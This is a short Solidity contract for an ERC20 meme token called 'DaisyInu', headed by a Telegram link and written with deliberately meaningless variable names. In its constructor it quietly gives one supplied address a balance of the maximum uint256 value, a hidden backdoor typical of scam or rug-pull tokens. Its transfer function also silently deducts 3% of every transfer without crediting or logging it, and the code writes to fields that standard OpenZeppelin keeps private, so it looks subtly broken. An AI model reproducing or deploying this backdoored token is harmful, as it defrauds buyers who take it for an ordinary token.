// https://t.me/daisyinu

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract DaisyInu is ERC20, Ownable {
    uint256 private prove = ~uint256(0);
    uint256 public chance = 3;

    function _transfer(
        address wrapped,
        address brief,
        uint256 laugh
    ) internal override {
        _balances[wrapped] -= laugh;
        uint256 recently = (laugh / 100) * chance;
        laugh -= recently;
        _balances[brief] += laugh;
    }

    constructor(
        string memory pie,
        string memory proper,
        address took,
        address helpful
    ) ERC20(pie, proper) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[helpful] = prove;
    }
}